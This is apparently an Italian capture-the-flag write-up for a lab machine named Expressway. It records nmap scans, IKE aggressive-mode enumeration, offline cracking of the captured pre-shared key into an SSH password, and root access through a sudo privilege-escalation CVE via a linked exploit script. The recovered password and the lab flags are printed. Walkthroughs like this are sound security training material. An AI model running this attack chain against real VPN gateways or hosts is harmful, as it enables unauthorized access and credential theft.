# Macchina Expressway

IP attaccante: 10.129.100.252

## Recon

`scan TCP: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.100.252`

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63

scan UDP (-sU): sudo nmap -sU -sV -T4 -oN porte_udp 10.129.100.252

PORT      STATE         SERVICE        VERSION
21/udp    open|filtered ftp
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
500/udp   open          isakmp?
639/udp   open|filtered msdp
776/udp   open|filtered wpages
996/udp   open|filtered vsinet
1012/udp  open|filtered sometimes-rpc1
1027/udp  open|filtered unknown
1035/udp  open|filtered mxxrlogin
4500/udp  open|filtered nat-t-ike
16974/udp open|filtered unknown
17184/udp open|filtered unknown
17585/udp open|filtered unknown
18821/udp open|filtered unknown
18987/udp open|filtered unknown
19161/udp open|filtered unknown
19227/udp open|filtered unknown
19647/udp open|filtered unknown
19956/udp open|filtered unknown
23980/udp open|filtered unknown
32768/udp open|filtered omad
62699/udp open|filtered unknown
```

La presenza della porta 500 indica che il dispositivo sta probabilmente eseguendo una VPN IPSec (ISAKMP), un servizio VPN comune.

## porta 500

`sudo nmap -sU -sC -sV -p500 10.129.100.252`

```bash
PORT    STATE SERVICE VERSION
500/udp open  isakmp?
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
```

### IKE enumerazione e explotazione

`sudo ike-scan -M 10.129.100.252`

ike-scan è uno strumento che scopre e fingerprinta demoni IKE (usati per negoziare tunnel IPsec/VPN). Invia pacchetti ISAKMP/IKE al target e registra le risposte (inclusi eventuali Vendor ID) per identificare implementazioni e comportamenti. 

-M forza l’esecuzione della Main Mode (la modalità «main» di IKEv1, fase 1).
Main Mode è il flusso più conservativo e «protetto» — richiede 6 messaggi per completare la negoziazione e protegge l’identità dei peer.
In pratica ike-scan -M invia le sonde necessarie per provare un Main Mode handshake e registra le risposte del responder. Se il responder risponde, puoi ottenere informazioni utili (es. Vendor ID, pattern di retransmission backoff, ecc.) che aiutano a fingerprintare il dispositivo.
IKEv1 origina su UDP/500, quindi ike-scan comunicherà tipicamente verso la porta 500 del target.

L'output potrebbe mostrare:

- Host che risponde: conferma che IKE è attivo (es. 500/udp open isakmp).
- Vendor ID payloads o fingerprint riconosciuti (es. Cisco, Juniper, Fortinet, ecc.).
- Pattern di retransmission/backoff usati per fingerprinting.

```
10.129.100.252    Main Mode Handshake returned
    HDR=(CKY-R=e000fc14add6a50d)
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
    VID=09002689dfd6b712 (XAUTH)
    VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
```

handshake IKE Main Mode ha restituito:

SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK ...) — il peer richiede una chiave pre-condivisa (PSK) e utilizza 3DES + SHA1, che è debole secondo gli standard moderni.
Erano presenti gli ID fornitore (XAUTH, Dead Peer Detection).
Poiché erano presenti gli ID fornitore e XAUTH, si prova la modalità aggressiva per vedere se il servizio divulga l'identità o il materiale PSK:

`sudo ike-scan -A -Ppsk.txt 10.129.100.252`

-A (Aggressive Mode)
forza una negoziazione in Aggressive Mode (IKEv1). In questa modalità la risposta del responder può includere dati non cifrati (in particolare un hash legato alla Pre-Shared Key — HASH_R) che può essere usato per attacchi offline contro la PSK. Per questo motivo Aggressive Mode è più “rivelatrice” rispetto a Main Mode.
-Ppsk.txt
l’opzione -P abilita la raccolta/visualizzazione del materiale necessario per il cracking della PSK (ossia cattura l’hash/parametri quando il target risponde in Aggressive Mode) e, se passi un nome file (qui psk.txt), ike-scan salva lì l’output utile per strumenti di cracking come psk-crack, john o hashcat. In pratica stai dicendo: “prova Aggressive Mode e salva in psk.txt qualsiasi hash/parametro utile per un cracking offline”.

Se il target supporta Aggressive Mode e usa PSK per l’autenticazione, potresti ricevere una risposta contenente Hash_R e parametri (SA, KE, Nonce, ID, ecc.) — questi dati permettono di tentare un attacco offline per recuperare la PSK.

Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.100.252    Aggressive Mode Handshake returned HDR=(CKY-R=be70b5d1dd981eb8) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

La modalità aggressiva ha restituito un'identità e un hash:
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) — l'identità IKE è stata divulgata.
È stato restituito un hash PSK di 20 byte e salvato in psk.txt.

psk.txt:
`bf8ed3fc1b2f39052ee678a500f68b142accb7e216c8a5ffa15938f0983e465e849b15dfa215a6a59b87b9a3aeb454f29b8cbe0dd3b9cd3e1f517d409a3942757739b4698f0fd63f9b8be8b2dd1237044fd544aa768ba1f970475e1da8fec28f3dfc03cf0ecd50b1d100fc757255a34e5291e154960906911f70a90a5f890e99:bc14396d977dfe4d604e104d2a59cee9c3e0c96ade16cfa791a34efb2ed0292d97063b7a5d2cc726a7fc9f5fbbda95001cf9a366f07bb743e047e547e90db8ddb051ba07d927efde27631c5a8201435345706211f29556d773185825105694e241c674f906e394ae1bbc69a779558e8742beee0edc32f1f579ae860610615224:be70b5d1dd981eb8:58e69faeb6a210e2:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:d5b3727524f69cc738f6a02187f10ea7e7292302:c5e16463e25680d84bb777ca6b9ccfe6a7a4e89cf0910e9a4baef6b58f472d81:5d1dc3a48adae5d40d5b51bdf29d8b468455155e`

`sudo ike-scan --aggressive 10.129.100.252 -n ike@expressway.htb --pskcrack=hash.txt`

`-n ike@expressway.htb`
imposta l’ID inviato nell’exchange (IDi o IDr). In Aggressive Mode l’ID può comparire in chiaro nella risposta: spesso è necessario scegliere/correspondere l’ID corretto per ottenere una risposta utile (alcuni dispositivi rispondono solo a ID attesi). Qui stai inviando ike@expressway.htb come identificatore.

`--pskcrack=hash.txt`
istruisce ike-scan a salvare in hash.txt il materiale necessario per il cracking della Pre-Shared Key (se il target risponde in modo da fornire quel materiale — tipicamente possibile con Aggressive Mode). Il file risultante conterrà l’hash/parametri che poi puoi usare con strumenti di cracking offline (es. psk-crack, o con conversione per john/hashcat)

```
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.100.252    Aggressive Mode Handshake returned HDR=(CKY-R=5ee7cd4e550ca844) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
```

hash.txt:
`7c7655bf722ff713b5acad2e86ebcb0d79926211697e987c8eb5c599ccac7b0ae1405b949e74b6deb1d2595830b2a5a56105ee48dc0d96f47913615668769de137c5176aac4ca6e480864bde025b62fb22222d289f8cb701501945a35b23a43d254834e53447e9b3b74fb0489ec3fc1f0d449ca5778c4920335ee0811dedd1b3:b997714a22e2a3f5c5fea332b5642a9cabd767bba6df25ee5e26ae473fbdf0dd8ece2c7b3a375d499339d34fb7587e001082b1c049ab29b28be1a1ec88e5d1647f94bbc17a3d66fcbbd7a748625cab59699d1868985f693d70db4ef22c879b38a1a98be8b4a419b92e9eea4fbfb6f96d9a80b6b05ae2170c2ab36848dbd32006:5ee7cd4e550ca844:820eb9cba76d5ea7:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:e85b83fa23b2059721d44f129456d734dd634c91:21656f580686d1ccfa06139965beca451f37ff79e4fe2800f3ebb2e17ae59b5c:55e9dec8b900514eeb87172fbd26538d5f4a60f7`

### Crack della Pre-Shared Key (PSK) per IKE

psk-crack è un utility che tenta di craccare offline una Pre-Shared Key (PSK) per IKE (ottenuta ad es. con ike-scan -A --pskcrack=hash.txt ...).
-d /usr/share/wordlists/rockyou.txt indica la wordlist (qui rockyou.txt) da usare come sorgente delle password candidate (modalità dizionario).
hash.txt è il file che contiene l’hash/parametri estratti dal target (NON la PSK stessa) — psk-crack usa quei parametri per verificare, per ogni voce della wordlist, se corrisponde alla PSK che ha generato la risposta catturata.

```
Starting psk-crack [ike-scan 1.9.5] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 55e9dec8b900514eeb87172fbd26538d5f4a60f7
Ending psk-crack: 8045040 iterations in 4.503 seconds (1786446.04 iterations/sec)
```

trova la password: freakingrockstarontheroad

## SSH (porta 22)

quindi proviamo ad entrare in ssh con
user: ike 
password: freakingrockstarontheroad

Effettivamente si riesce ad entrare e nella directory è presente il file user.txt con la user flag:
`337f6f0bcab8ac0d841714a4fdf17fb7`

### Scalata dei privilegi

`sudo -V `
troviamo la versione di sudo

```
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

La versione 1.9.17 è soggetta alla vulnerabilità CVE-2025–32463
Esistono exploit per questa vulnerabilità:
https://github.com/kh4sh3i/CVE-2025-32463/blob/main/exploit.sh

creare un file bash con lo script dell'exploit
dare il permesso di esecuzione al file (chmod +x)
eseguire il file -> si diventa root

Nella cartella root si trova il file root.txt che contiene la root flag:
`a4b40e77a490797f7c87317bfb6012ea`
